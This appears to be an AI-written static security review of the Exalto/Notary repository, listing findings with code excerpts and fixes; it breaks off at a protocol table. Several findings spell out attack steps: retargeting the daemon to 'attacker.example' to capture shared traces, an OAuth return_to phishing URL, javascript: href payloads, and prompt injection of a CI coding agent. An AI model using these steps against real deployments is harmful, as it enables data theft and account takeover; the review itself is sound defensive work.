# Exalto / Notary repository security review

**Reviewer:** Cursor Grok 4.6 (source review)  
**Review date:** 2026-09-05  
**Revision reviewed:** `66f94c6ba4f6ec63c8468a77d0f891401627cdce` (`main`, “Consolidate public guides on Exalto Seal”)  
**Method:** Two-pass static review. Pass 1 mapped trust boundaries and evidence/sharing leaks. Pass 2 hunted remote cyber threats: notary framing and bincode, HTTP/1.1 CL/TE residue, IDOR/SQLi, session cookies, public exposure of “internal” APIs, XSS/`javascript:` hrefs, container uid, CI supply chain, and updater/signing jobs. Findings were checked against the current source. This is not a live pentest and no production secrets were exercised.

This review privileges two classes of issue:

1. **Wrong-participant disclosure** — plaintext, credentials, tickets, or private artifacts reaching the remote notary, another user, a public share, or an attacker-controlled origin.
2. **Protocol / evidence attack surface** — hostname allowlist, Proxy-TLS, selective disclosure, verification, admission tickets, key discovery, and anything that could forge, mix, or weaken a sealed Trace.

---

## Executive summary

The core evidence path is carefully constructed. I did **not** find a bug that lets an untrusted party forge a notary attestation, mix `evidence.tlsn` with unrelated HTTP/OTLP under a successful verify, or recover provider header credentials from a correctly disclosed `.llmtrace`. Header values other than the structural `Transfer-Encoding: chunked` are committed without revealing the value; the notary connects only after an exact hostname allowlist check and later binds the receipt to a WebPKI-validated certificate for that name; archive verification requires a canonical ZIP, matching hashes, and byte-identical OTLP reproduction.

The serious issues are on the **confidentiality, local-trust, and sharing** edges of that design:

- Shared packages **deliberately disclose full HTTP bodies and the request target** (including query strings). A heuristic `public_safety` gate is the only thing that keeps credentials out of Listed/Unlisted shares. That gate has a confirmed query-key parsing bug and several heuristic gaps.
- The local daemon’s administration and proxy APIs are **unauthenticated on loopback by default**. Combined with a caller-chosen `api_origin` and an unpinned desktop account-link host check, a local attacker can bind the daemon to an attacker HTTPS origin (registry, admission, and share uploads follow that origin) or drive hosted credit burn / share.
- Device approval secrets travel in URLs. OAuth `return_to` can drop a logged-in user onto an attacker-started device-approval page.
- Hosted anonymous verification rate limits trust client-controlled forwarding headers. Compose publishes the notary protocol port on all host interfaces.
- The hosted **notary control plane** (`/api/internal/notary/*` redeem/activate/settle) is on the same public `/api/*` vhost as the website, gated only by the shared service bearer. Admin dashboard `href={verification_uri_complete}` is an unvalidated URL (including `javascript:`).

No Critical (remote unauthenticated evidence forgery / mass credential theft from the notary without a stolen secret) finding was confirmed. Pass 2 also did **not** find owner IDOR, SQL injection, zip-slip in `.llmtrace`, or unbounded notary frame allocation (length is capped before `vec![0; n]`).

| ID | Severity | Confidence | Title |
| --- | --- | --- | --- |
| H1 | High | High | Unauthenticated loopback admin can retarget `api_origin` (registry, tickets, shares) |
| H2 | High | High | Desktop account links accept any HTTPS host; approval secrets in the URL |
| H3 | High | High | Shared packages disclose request targets; percent-encoded query keys bypass the credential-key check |
| H4 | High | High | macOS refresh token passed on `security -w` argv |
| H5 | High | High | Anonymous `/api/verify` rate limits spoofable via forwarding headers |
| H6 | High | High | Compose publishes `notary-server` on `0.0.0.0` |
| H7 | High | High | Public `/api/*` edge exposes notary redeem/activate/settle (service-token-only) |
| M1 | Medium | High | OAuth `return_to` device-approval phishing (plus `..` path prefix hole) |
| M2 | Medium | High | Vault passphrase / cluster key files follow symlinks; empty passphrase allowed |
| M3 | Medium | High | Desktop adopts any healthy listener on `:8788` |
| M4 | Medium | High | Share upload URL allowlist is “any public HTTPS hostname” |
| M5 | Medium | High | Capture byte limit and usage recording happen after the TLS session |
| M6 | Medium | High | No CSP / `frame-ancestors` on the hosted edge |
| M7 | Medium | Medium | Shared-trace Markdown has no explicit sanitizer |
| M8 | Medium | High | Provider connect is hostname-allowlisted, not destination-IP-filtered |
| M9 | Medium | High | Unauthenticated cluster proxy; ticketless generic notary capacity |
| M10 | Medium | High | Updater artifact URLs are HTTPS-only, not origin-pinned |
| M11 | Medium | High | Admin dashboard `href={verification_uri_complete}` is unsanitized |
| M12 | Medium | Medium | Capture proxy keeps client `Content-Length` after stripping `Transfer-Encoding` |
| M13 | Medium | High | Production `notary-api` / `notary-server` images run as root |
| M14 | Medium | Medium | CI floating tags (`claude-code-action@v1`, `rust-toolchain@master`) and public `@claude` trigger |
| L1 | Low | High | Password-protected Listed search hits a constant haystack |
| L2 | Low | High | Admin dashboard `postMessage(..., '*')` |
| L3 | Low | High | Unauthenticated `/metrics` on notary-server and API |
| L4 | Low | High | S3 keys in Compose environment; broad trusted-proxy CIDR |
| L5 | Low | Medium | `/downloads/*` reverse-proxies an entire Tigris bucket host |
| L6 | Low | High | `allow_high_entropy` / `force` share override; `signature` entropy exemption |
| L7 | Low | Medium | Public-object `Cache-Control: public, max-age=31536000, immutable` |
| L8 | Low | Medium | Session cookies lack `__Host-` (sibling-subdomain tossing residual) |

---

## Trust model (as implemented)

| Participant | Sees application plaintext? | Role |
| --- | --- | --- |
| Provider client / `notaryd` | Yes (credentials, bodies) | Local proxy, vault, capture, notarization, verify |
| Generic remote notary | No application plaintext | Resolves allowlisted provider, relays Proxy-TLS records, signs receipts/attestations |
| Hosted platform | Disclosed `.llmtrace` after explicit share | Admission tickets, credits, verify-for-share, public links |
| Independent verifier | Disclosed package only | Offline check against a trusted notary key |

Documented non-goals still matter operationally: the system does not prove who authored a prompt, that local tools ran, or that a notary key was never compromised. The hosted registry JSON is **not separately signed**; HTTPS origin security plus a monotonic local cache are part of key distribution.

A `.llmcapture` is private retry state that can reconstruct the original request, including credentials. It must only exist vault-encrypted. A `.llmtrace` is the public evidence object: bodies in, header values (almost all) out.

---

## Findings

### H1 — Unauthenticated loopback admin can retarget the hosted API origin

**Severity:** High  
**Confidence:** High  
**Type:** Confirmed (local attacker / local malware; drive-by depends on browser private-network protections)

Default admin auth is off, and that is explicit:

```80:82:runtime/crates/notaryd/src/config.rs
    /// Optional HTTP Basic authentication for the loopback administration
    /// listener. The listener is open to local processes when omitted.
    pub auth: Option<AdminAuthConfig>,
```

```532:535:runtime/crates/notaryd/src/admin.rs
async fn require_auth(...) {
    if state.config.admin.auth.is_none() {
        return next.run(request).await;
```

`POST /v1/account` takes a caller-supplied `api_origin` (defaulting to the public origin) with no pinning to config:

```1751:1778:runtime/crates/notaryd/src/admin.rs
struct AccountConnectionRequest {
    #[serde(default = "default_public_origin")]
    api_origin: String,
    ...
}
let pending = auth::start_authorization(&body.api_origin, &body.device_name)
```

`ApiOrigin::parse` accepts **any** HTTPS origin without a path (`runtime/crates/notaryd/src/service/api_origin.rs`). After a successful poll, credentials, registry fetches (`GET /api/registry`), admission tickets, and share uploads all follow that origin.

**Attack (local process, default desktop/daemon):**

1. `POST http://127.0.0.1:8788/v1/account` with `{"api_origin":"https://attacker.example"}`.
2. The daemon talks to the attacker’s device-authorization API and stores the attacker-issued `poll_secret`.
3. `GET /v1/account/{request_id}` completes the poll. The attacker returns a refresh token immediately.
4. `notaryd` persists credentials for the attacker origin.

From then on the daemon will fetch an attacker registry (untrusted notary keys), send admission traffic to the attacker, and upload disclosed `.llmtrace` packages (prompts and model output) to attacker-controlled share intake.

The same unauthenticated surface can share traces, toggle capture, and read catalog previews. The proxy (`127.0.0.1:8787`) is also unauthenticated: with capture on and a connected account, any local caller can burn hosted tickets by sending provider requests.

There is **no `Host` allowlist** on the admin listener, so classic DNS-rebinding against `:8788` is in scope for browsers that do not enforce Private Network Access. Chromium PNA makes drive-by harder; it is not a substitute for daemon-side origin checks.

**Why it matters:** This is not “local malware already has the user’s files.” It binds cryptographic trust (registry keys) and sharing (disclosed traces) to an attacker origin using only the local HTTP API.

**Fix direction:** Default-on admin auth for desktop-managed daemons; pin `api_origin` to compiled/config origin (override only when auth is on); require `Host` in `{127.0.0.1, localhost, [::1]}`; do not treat foreign health checks as owned (see M3).

---

### H2 — Desktop account links are not host-pinned; approval secrets live in URLs

**Severity:** High  
**Confidence:** High  
**Type:** Confirmed

Device authorization puts `approval_secret` in the query string of `verification_uri_complete`:

```281:288:platform/crates/notary-api/src/devices.rs
            verification_uri_complete
                .query_pairs_mut()
                .append_pair("request_id", &request_id)
                .append_pair("approval_secret", &approval_secret);
```

The SPA reads those query parameters and sends them as `X-Notary-Approval-Secret` (`platform/web/src/site/AuthorizationPages.tsx`). The desktop app opens that URL via `open_account_link` after `validate_account_link`, which allows **any** `https` host (and loopback `http`) as long as the path/query shape matches. Tests explicitly accept `https://notary.example/...&approval_secret=xyz` (`apps/notary-app/src-tauri/src/lib.rs`).

```390:455:apps/notary-app/src-tauri/src/service_client.rs
pub(super) fn validate_account_link(value: &str) -> Result<Url, String> {
    // scheme https or loopback http; path /authorize with request_id + approval_secret
    // no host allowlist
```

**Consequences:**

- The capability secret leaks via history, screenshots, Referer (no `Referrer-Policy` on the hosted edge; see M6), crash reports, and shared links.
- Combined with H1, a poisoned `verification_uri_complete` is opened in the system browser without checking it is `seal.exalto.ai` (or the configured origin).
- Combined with M1, a victim who signs in can be dropped on a pre-filled approval page for an attacker-started device.

The dashboard “Open approval page” link (`runtime/apps/admin-dashboard/src/views/SettingsView.tsx`) has the same URL.

**Fix direction:** Pin account-link hosts to the configured public origin; put `approval_secret` in a fragment or a one-time exchange, never a durable query; add `Referrer-Policy: no-referrer` on `/authorize`.

---

### H3 — Selective disclosure reveals the request target; query-key checks skip URL decoding

**Severity:** High (shared-package confidentiality)  
**Confidence:** High  
**Type:** Confirmed bug on top of an intentional disclosure contract

Integrity of sealed evidence still holds. Confidentiality of **shared** packages does not equal “credentials cannot appear.”

Disclosure ranges include the full request target and both bodies; header *values* are redacted except `Transfer-Encoding: chunked`:

```581:593:runtime/crates/notary-core/src/lib.rs
    sent.union_mut(request.without_data());
    sent.union_mut(&request.request.target);
    // header values redacted unless transfer-encoding: chunked
    if let Some(body) = &request.body {
        sent.union_mut(body);
    }
```

`without_data()` excludes target, headers, and body (`runtime/vendor/tlsn-utils/spansy/src/http/types.rs`), so the subsequent header loop is meaningful. The **request line is fully public**, including `?query`.

The local proxy forwards the caller’s query string unchanged:

```1052:1055:runtime/crates/notaryd/src/service/proxy.rs
        let path_and_query = match uri.query() {
            Some(query) => format!("{upstream_path}?{query}"),
            None => upstream_path,
        };
```

`validate_redacted_headers` skips the first line (`.skip(1)`), so it never inspects that query.

The sharing gate `scan_request_target` splits raw query keys and runs `is_credential_key` / `is_signed_query_key` **without URL-decoding**. `normalized_key` keeps only alphanumerics, so `api%5Fkey` becomes `api5fkey` and does not match `apikey`. The same bypass applies to `x%2Damz%2Dsignature`.

```229:252:runtime/crates/notary-core/src/public_safety.rs
    for pair in query.split('&') {
        let key = pair.split_once('=').map_or(pair, |(key, _)| key);
        if is_credential_key(key) || is_signed_query_key(key) {
            return Err(... "credential_query_value" ...);
        }
    }
```

Defense in depth: `scan_public_bytes` on the request head still catches `sk-`, `sk-proj-`, `sk-ant-`, JWTs, PEM private keys, and a few other patterns. **Entropy scanning is not applied to the request line**, only to bodies (`scan_body` → `scan_entropy_tokens`).

**What still gets through:** percent-encoded credential parameter names whose values are not those known token formats (short shared secrets, session tokens, custom `token=` values, signed URL parameters that do not match the encoded-key list). Those bytes are then in every admitted `.llmtrace` and on the hosted platform.

This does **not** forge evidence. It weakens the only control that keeps secrets out of a cryptographically authentic public package.

**Fix direction:** RFC 3986-decode query keys (reject malformed `%`); run entropy and secret-pattern scans on decoded query values; consider refusing to share (or to notarize) when the request target contains a query string at all, unless an allowlist of known-safe parameter names is met. Document clearly that share ≠ header redaction ⇒ body/query secrecy.

---

### H4 — macOS device refresh token on process argv

**Severity:** High  
**Confidence:** High  
**Type:** Confirmed

```1094:1107:runtime/crates/notaryd/src/service/auth.rs
fn keychain_store(token: &str) -> Result<()> {
    let status = Command::new("security")
        .args([
            "add-generic-password",
            ...
            "-w",
            token,
        ])
```

`security add-generic-password -w <token>` puts the hosted device refresh token in argv. Other local processes can often read that via process listing. Linux uses `secret-tool` with stdin (safer). Desktop vault unlock already uses stdin (`NOTARYD_VAULT_KEY_STDIN`) and should be the pattern here.

Compromise of that token is account takeover for hosted admission, credit spend, and sharing (refresh replay detection will revoke the device if the legitimate daemon also refreshes — a race, not a guarantee).

**Fix direction:** Prefer the Keychain API / `keyring` crate (already used for the vault key); never pass the secret on argv.

---

### H5 — Anonymous verification rate limits trust spoofable client-IP headers

**Severity:** High (availability / resource exhaustion of the verifier)  
**Confidence:** High  
**Type:** Confirmed

Admissions correctly resolve client IP only when the **peer** is in `trusted_proxy_cidrs` (`platform/crates/notary-api/src/admissions.rs` `resolve_client_ip`). Public-trace password attempts use that helper.

Anonymous verification does not:

```310:325:platform/crates/notary-api/src/verification/api.rs
fn client_ip(headers: &HeaderMap) -> String {
    ["x-notary-client-ip", "fly-client-ip", "cf-connecting-ip"]
        .into_iter()
        ...
        .or_else(|| {
            headers.get("x-forwarded-for")
            ...
        })
```

Anyone who can reach `notary-api` (Compose network peer, Flycast sibling, mistaken public `http_service`) can rotate those headers and bypass per-IP leases / in-flight limits. The gateway overwrites `X-Notary-Client-IP` but does **not** strip `Fly-Client-IP`, `CF-Connecting-IP`, or `X-Forwarded-For`, so a missing gateway header falls through to client-controlled values.

Verification is CPU-heavy (same bounded workers as share admission). This is a protocol-adjacent DoS against sealing/verification capacity, not an integrity bypass.

**Fix direction:** Reuse `resolve_client_ip` (peer + CIDR). Strip incoming forwarding headers at the gateway except the one hop you set. Do not put `/metrics` and `/api/verify` on an Internet-facing API listener (see L3).

---

### H6 — Compose publishes the notary protocol on all host interfaces

**Severity:** High for a Compose host that is not firewalled  
**Confidence:** High  
**Type:** Confirmed (deployment)

```118:131:compose.yml
      NOTARY_SERVER_LISTEN: 0.0.0.0:7047
      ...
    ports:
      - "${NOTARY_SERVER_PORT:-7047}:7047"
```

The web gateway is bound to loopback (`127.0.0.1:${WEB_HTTP_PORT:-80}:80`). The notary is not. Production Fly terminates TLS on 443 (`deploy/fly/notary-server.fly.toml`); Compose does not. A ticketed notary on cleartext TCP exposes admission tickets in the prelude (`connect_notary` only *requires* outer TLS when an admission value is present **and** the endpoint is not loopback — a Compose `notary-api.internal` hop can still be cleartext).

Unauthenticated reachability of a **hosted** notary is ticket-gated (good). Reachability of a **ticketless** binary, or of a ticketed binary whose tickets can be sniffed on the host network, is capacity abuse and (with sniffed tickets) stolen notarization budget.

**Fix direction:** Publish `127.0.0.1:7047:7047` (or do not publish; use the Compose network only). Treat `tls://` as required for any non-loopback notary that carries tickets.

---

### H7 — Public `/api/*` edge exposes notary redeem / activate / settle

**Severity:** High (privileged control plane on the public hostname)  
**Confidence:** High that the routes are Internet-reachable via Caddy; exploit without a leaked token is not shown  
**Type:** Confirmed (deployment + routing)

`POST /api/internal/notary/admissions/redeem`, `…/operations/activate`, and `…/operations/settle` live on the same Axum router as the public website API (`platform/crates/notary-api/src/lib.rs` `hosted_router` merges `admissions::router()`). They are part of the published OpenAPI path list. Both `deploy/gateway.Caddyfile` and `platform/web/Caddyfile.fly` reverse-proxy **all** `/api/*` to `notary-api`.

Auth is only `authenticate_service`: Bearer compared as SHA-256 of the shared `service_token` (min 32 characters, constant-time on the digests). There is **no** peer CIDR / Flycast-only check on these handlers, unlike admission client-IP logic.

```842:854:platform/crates/notary-api/src/admissions.rs
fn authenticate_service(...) {
    // Bearer token required; SHA-256 then ct_eq; no network ACL
}
```

Fly comments describe the API as private, but the **web** app is public and forwards the internal prefix. Anyone who obtains the service token (compromised `notary-server`, secret store, log, or over-broad CI) can redeem tickets, activate operations, and settle usage **from the Internet** — credit fraud and settlement abuse — without being on the private mesh.

**Fix direction:** Do not proxy `/api/internal/*` on the public Caddy vhost; bind those routes to Flycast/private listen only, or require mTLS / source CIDR in addition to the bearer. Treat the service token as a production root secret.

---

### M1 — OAuth `return_to` can land on attacker device approval

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed

```63:71:platform/crates/notary-api/src/browser_auth.rs
fn allowed_return_to(value: String) -> Option<String> {
    (value.starts_with("/authorize?")
        || value == "/account"
        || value.starts_with("/account/")
        ...
```

Any `/authorize?…` query is allowed. After GitHub/Google login the server `Url::join`s that onto `public_origin` and 303s there. The SPA uses the same prefix list (`platform/web/src/site/SiteApp.tsx`).

**Attack:** start device auth → send `https://seal.exalto.ai/api/auth/github?return_to=/authorize?request_id=…&approval_secret=…` → after OAuth the victim lands on a first-party page that already holds the attacker’s approval secret. Approval still needs a click and shows the device name, but this is consent phishing greased by the login redirect. Tests block absolute/`//` URLs, not this case.

`/account/../authorize?…` also passes `starts_with("/account/")` and normalizes to `/authorize?`. Defense-in-depth failure; same end state because `/authorize?` is already allowed.

**Fix direction:** Allow only exact paths, or `/authorize` with a server-issued `return` token bound to the OAuth state — never a caller-supplied `approval_secret`. Normalize/reject `..` and `%2e%2e` before prefix checks.

---

### M2 — Vault key files follow symlinks; empty passphrase is allowed

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed local weakness

`read_passphrase_file` / `read_server_key_file` use `fs::metadata` (follows symlinks), check `0600` on the **target**, then `fs::read` (`runtime/crates/notary-core/src/vault.rs`). E2E CA loading elsewhere rejects symlinks; these paths do not. TOCTOU between the mode check and the read is possible.

`Vault::init_passphrase` documents that an empty passphrase is allowed and does not protect checkpoint confidentiality. Desktop still contains a `desktop-convenience-v1` empty-passphrase marker path.

Deferred `.llmcapture` remains reconstructible plaintext, including provider credentials, if the vault key is empty or replaced via a symlink.

**Fix direction:** `symlink_metadata` + refuse non-regular files (`O_NOFOLLOW`); refuse empty passphrases outside tests; treat the cluster vault key file as equivalent to every captured API key.

---

### M3 — Desktop will adopt an already-listening “healthy” daemon

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed

```284:286:apps/notary-app/src-tauri/src/daemon.rs
    if !managed_child && daemon_is_healthy().await {
        return Ok(());
    }
```

If anything answers the admin health/version check on `127.0.0.1:8788`, the app does not spawn the sidecar and treats that service as the workspace. Combined with H1, a local fake admin can feed account links, dashboard HTML (iframe `frame-src http://127.0.0.1:8788`), and share actions into the app.

**Fix direction:** Refuse foreign listeners unless the user explicitly attaches; require a pairing secret the sidecar writes and the app injects.

---

### M4 — Share upload URLs: any public HTTPS hostname

**Severity:** Medium  
**Confidence:** High  
**Type:** Residual given a compromised/malicious share API (amplified by H1)

```645:647:runtime/crates/notaryd/src/service/sharing.rs
    if upload.scheme() == "https" && !upload_is_private_ip {
        return Ok(upload);
    }
```

Literal private IPs are blocked; **hostnames** are not resolved for private ranges. Redirects are disabled; `Authorization` / `Cookie` / `Host` cannot be set on the upload. A malicious API origin can still point the daemon at `https://metadata.internal` or a rebinding name (SSRF-ish PUT of package bytes — the package is already disclosed evidence, but the daemon becomes an egress client).

**Fix direction:** Allowlist object-store hosts, or resolve and reject RFC1918/link-local/metadata after DNS (and again after connect).

---

### M5 — Session byte limit is enforced after TLS + usage recording

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed logic / billing-capacity gap

In `run_notary_session` the notary counts application-data ciphertext, **records usage**, then rejects if `transcript_bytes > max_transcript_bytes` — **before** issuing a receipt (`runtime/crates/notary-core/src/lib.rs` around the usage recorder and the subsequent limit check). Oversize captures therefore:

- consume notary CPU/memory and upstream sockets for the full session;
- can settle authenticated bytes / burn a one-operation ticket;
- never produce a receipt.

A holder of a valid ticket (or a ticketless notary’s open port) can force expensive work without a durable capture. Limits that only apply after the handshake do not protect capture-slot availability.

**Fix direction:** Bound streaming TLS application data during the session; do not settle success-path usage for a session that will not issue a receipt (or settle `ServiceFailed` with 0 bytes unless the bytes were actually attested).

---

### M6 — Hosted edge has no CSP or frame restrictions

**Severity:** Medium (High for clickjacking `/authorize` if combined with H2)  
**Confidence:** High  

`deploy/gateway.Caddyfile` and `platform/web/Caddyfile.fly` set `X-Robots-Tag` on `/s/*` and almost no other security headers: no `Content-Security-Policy`, `frame-ancestors`, `X-Frame-Options`, `Referrer-Policy`, or `X-Content-Type-Options`.

The authorize UX is a clickjacking / Referer-leak target while `approval_secret` is in the query.

**Fix direction:** `frame-ancestors 'none'`; `Referrer-Policy: no-referrer` (at least on `/authorize` and `/s/*`); strict CSP; `X-Content-Type-Options: nosniff`.

---

### M7 — Shared traces render Markdown without an explicit sanitizer

**Severity:** Medium  
**Confidence:** Medium  

`platform/web/src/site/PublicTracePages.tsx` uses `<ReactMarkdown>{...}</ReactMarkdown>` with no `rehype-sanitize` / `urlTransform`. `react-markdown` defaults typically skip raw HTML and `javascript:` URLs, so this is not a confirmed stored XSS today. Attacker-controlled shared content can still inject phishing links and (depending on defaults) images/beacons. Missing CSP (M6) increases blast radius if rendering regresses.

**Fix direction:** `rehype-sanitize` + https-only links; CSP `img-src`/`connect-src` allowlists.

---

### M8 — Notary provider connect: hostname allowlist, no destination IP policy

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed design gap (exploitable if DNS for an allowlisted name is wrong)

```1711:1726:runtime/crates/notary-core/src/lib.rs
            let server_name = verifier.config().server_name().as_str().to_owned();
            if !allowed_hosts.iter().any(|host| host.eq_ignore_ascii_case(&server_name)) {
                // reject
            }
            let upstream = TcpStream::connect((server_name.as_str(), 443)).await ...
```

Config rejects IPs, wildcards, and URL-shaped hosts. After the string check the notary resolves and dials `:443` with **no** private/link-local/metadata deny list.

This is not classic “read IMDS over HTTP” SSRF: the client (and `verified_connection_metadata`) still require a WebPKI cert for `server_name`. It **is** TCP-level connect/probe of whatever IP the allowlisted name resolves to. Poisoned DNS for `api.openai.com` without a matching cert fails the handshake; an operator-added extra allowlist host that resolves inside a VPC is the realistic case.

The daemon also forces `Host` from the adapter, not the caller (`proxy.rs`), which is the correct complementary control.

**Fix direction:** Resolve, then refuse non-global unicast; optionally pin to expected address families. Keep the allowlist exact and tiny.

---

### M9 — Unauthenticated cluster proxy and ticketless public notary capacity

**Severity:** Medium (context-dependent)  
**Confidence:** High  

**Cluster:** non-loopback `proxy.listen` is allowed; the proxy has no client auth. With hosted admission enabled, anyone who can reach the proxy burns the replica’s tickets and writes artifacts. Perimeter auth is assumed.

**Generic `notary-server`:** `TicketlessAdmissionPolicy` accepts any caller with no ticket (`runtime/crates/notary-server/src/admission.rs`) and will sign under the process key up to local semaphores. Hosted `PlatformAdmissionPolicy` correctly requires a ticket, instance binding, and notarization `record_digest`. Do not expose ticketless binaries on a network whose signatures verifiers will trust.

Cleartext TCP for the protocol is inherent in `serve_on_listener`; Fly wraps 443 TLS, Compose (H6) does not.

---

### M10 — Updater: strong signatures, unpinned artifact host

**Severity:** Medium (defense in depth)  
**Confidence:** High  

Channel + manifest minisign, SHA-256, size, immutable `/releases/builds/{build_id}/...` suffix, and Tauri signature cross-check are solid. `require_https_url` does not pin hostname to `NOTARY_PUBLIC_ORIGIN`. A compromised signing key (CI PAT / minisign key) can point downloads at any HTTPS host. Same-version rollbacks are intentionally allowed if the channel signature is valid.

**Fix direction:** Allowlist download hosts; keep release-token scopes minimal.

---

### M11 — Admin dashboard opens unsanitized `verification_uri_complete`

**Severity:** Medium (High if `admin.auth` is enabled — session XSS)  
**Confidence:** High  
**Type:** Confirmed

The daemon stores whatever JSON string the device-authorization API returns and the dashboard renders it as a raw `href`:

```464:466:runtime/apps/admin-dashboard/src/views/SettingsView.tsx
            <a href={started.flow.verification_uri_complete} target="_blank" rel="noreferrer">
              Open approval page
            </a>
```

Unlike the desktop app, there is no scheme/host allowlist. Combined with H1 (caller-chosen `api_origin`), an attacker API can return `javascript:…` or `data:text/html,…`. A click runs script on the admin origin. With admin auth on, that origin holds `notary_admin_session` (HttpOnly does not stop same-origin `fetch` from XSS). Default unauthenticated admin is already fully exposed (H1); this adds a browser-session steal when operators turn auth on.

**Fix direction:** Parse as `https` URL, pin host to the configured API origin, reject other schemes. Never assign an API-supplied string to `href` without that check.

---

### M12 — Capture path keeps client `Content-Length` after stripping `Transfer-Encoding`

**Severity:** Medium  
**Confidence:** Medium  
**Type:** Confirmed framing residue (HTTP/1.1)

Hop-by-hop stripping removes `Transfer-Encoding` and `Connection`-nominated names, but **keeps** `Content-Length` (`end_to_end_headers` in `runtime/crates/notaryd/src/service/proxy.rs`). The capture path then collects the full inbound body (hyper may have used TE to parse it) and sends `chunked_request_body` — an unknown-length stream — with the original CL still on the request.

If a client sends both TE and CL (RFC 9112: TE wins inbound), leftover CL can disagree with `input.len()`. Hyper will prefer an explicit `Content-Length` for the outbound encoder. Mismatched length vs body can fail the send, hang, or produce TLS bytes whose HTTP framing is attacker-influenced. The notarized transcript is whatever was written on the wire; a provider parser that disagrees with TLSNotary’s HTTP parser on those bytes is a smuggling-class integrity risk.

**Fix direction:** After collecting the body, delete inbound `Content-Length` / `Transfer-Encoding` and set `Content-Length` from `input.len()` (or send a known-size body). Add a test for `TE: chunked` plus disagreeing `Content-Length`.

---

### M13 — Production API and notary-server images run as root

**Severity:** Medium  
**Confidence:** High  
**Type:** Confirmed

Root `Dockerfile` stages `notary-api` and `notary-server` copy binaries and `CMD`/`ENTRYPOINT` with **no** `USER`. `runtime/Dockerfile` `daemon` and `notary-server` stages are the same; only the `cluster` daemon stage drops to `10001`. Compose mitigates with `cap_drop: ALL`, `read_only`, and `no-new-privileges` for those two services; Fly tomls do not declare a non-root user.

RCE in the binary already has the process’s signing key / service token. Root inside the container still removes a step from secret-file reads outside the process umask, writable-path abuse, and some escape primitives.

**Fix direction:** Numeric non-root `USER` in every production stage; keep `cap_drop` / read-only.

---

### M14 — CI floating tags and public `@claude` trigger

**Severity:** Medium  
**Confidence:** Medium  
**Type:** Confirmed supply-chain surface

- `.github/workflows/claude.yml` runs `anthropics/claude-code-action@v1` (floating major) with `CLAUDE_CODE_OAUTH_TOKEN` whenever an issue/PR comment contains `@claude`. Permissions are read-oriented plus `id-token: write` and `actions: read`. Prompt injection in a public comment can steer an agent that can read the repo and Actions logs.
- `.github/workflows/claude-code-review.yml` uses `--permission-mode bypassPermissions` for OWNER/MEMBER/COLLABORATOR PRs.
- Signing/release jobs use `dtolnay/rust-toolchain@master` while Apple / Tauri signing secrets are loaded (`desktop-dmg.yml`, `release.yml`, and several other workflows).

No `pull_request_target` checkout of untrusted code with secrets was found. First-party workflows do not interpolate PR titles into `run:`.

**Fix direction:** Pin actions to commit SHAs; restrict `@claude` to org members; do not `bypassPermissions` on CI; pin `rust-toolchain` to a tag or SHA.

---

### L1 — Password-protected Listed traces match a fixed search string

**Severity:** Low  
**Confidence:** High  

```329:335:platform/crates/notary-api/src/traces/public.rs
           ) OR (
                traces.access_password_hash IS NOT NULL
                AND 'shared trace notary by exalto' ~* $2
           ))
```

Docs say protected Listed entries should not disclose search matches before access. Unfiltered index already returns those IDs (previews redacted). Searches such as `sha` / `tra` / `not` pull **all** protected Listed rows. Drop the constant-string branch.

HMAC on the access cookie is bound to `trace_id` + password hash (`trace_access_verifier`); cookie `Path` prefix quirks are therefore not an IDOR. Trace IDs are `trc-` + 32 hex chars (fixed length).

---

### L2 — Admin dashboard posts to `*`

**Severity:** Low  
**Confidence:** High  

`runtime/apps/admin-dashboard` uses `window.parent.postMessage(..., '*')`. The desktop parent checks `event.origin === http://127.0.0.1:8788` and `event.source`. Outbound `*` lets any embedder observe settings actions. XSS in the unauthenticated admin UI can trigger `restart_to_update` / `check_for_updates` / `set_launch_at_login` (forced install still needs a **signed** pending update).

---

### L3 — Unauthenticated metrics

**Severity:** Low–Medium depending on bind address  
**Confidence:** High  

`notary-server` serves `/metrics` with no auth (`runtime/crates/notary-server/src/server.rs`). API metrics are on the app port (`deploy/fly/notary-api.fly.toml` `[http_service]` + `[metrics] port = 8080`). Public Caddy only proxies `/api/*`, but a public API IP would expose Prometheus plus H5.

---

### L4 — Compose secret and proxy CIDR hygiene

**Severity:** Low–Medium  
**Confidence:** High  

OAuth/admission secrets use Compose `secrets:` `0400`. S3 access keys are plain environment variables (visible in `docker inspect` / proc environ). `NOTARY_API_ADMISSION_TRUSTED_PROXY_CIDRS` defaults to `172.16.0.0/12`, so any Compose peer can spoof `X-Notary-Client-IP` for admission and public-trace rate limits. Gateway trusts `CF-Connecting-IP` without proving Cloudflare is the client (mitigated if only the tunnel can hit `127.0.0.1:80`).

---

### L5 — `/downloads/*` proxies an entire Tigris host

**Severity:** Low  
**Confidence:** Medium  

`platform/web/Caddyfile.fly` `handle_path /downloads/*` reverse-proxies `https://notary-prod-downloads.t3.tigrisfiles.io` with no path allowlist. Guessable object keys become first-party downloads (Referer, cookie scope, bucket policy bypass). Prefer prefix allowlists or signed URLs.

---

### L6 — Share `allow_high_entropy` and field-name entropy exemptions

**Severity:** Low–Medium  
**Confidence:** High  

`validate_public_trace_package_with_context_and_force` can override **only** unexplained high entropy; known credential patterns stay fatal. Operators can still publish high-entropy secrets that do not match `sk-` / JWT / credential-key rules.

`is_intentionally_public_crypto_key` skips entropy when the field name **contains** `"signature"` (e.g. `user_signature` holding a bearer token). Pattern scanners may still catch JWTs.

---

### L7 — Public artifact objects advertised as year-long immutable CDN cache

**Severity:** Low  
**Confidence:** Medium  

`put_public_artifact` sets `Cache-Control: public, max-age=31536000, immutable` on the object (`platform/crates/notary-api/src/traces/storage.rs`). API HTTP responses correctly use `private, no-store`. If bucket policy, a signed URL, or a CDN is ever opened, caches will treat unshared or password-changed packages as permanently public.

---

### L8 — Session cookies are not `__Host-` prefixed

**Severity:** Low  
**Confidence:** Medium  

Hosted session / OAuth cookies are `Path=/`, `HttpOnly`, `Secure` (when HTTPS), `SameSite=Lax`, without `__Host-` (`platform/crates/notary-api/src/lib.rs`). A sibling host under the same registrable domain can set `Domain=.exalto.ai` and toss the cookie name. JSON mutating APIs still need `application/json` (no CORS), so this is not a demonstrated account takeover by itself.

---

## Protocol attack surface (no forgery found)

Reviewed with particular attention to mixing artifacts, confusing participants, and weakening verification.

| Control | Assessment |
| --- | --- |
| Hostname allowlist before connect | Exact match; IPs/wildcards rejected at config; daemon sets `Host` from adapter |
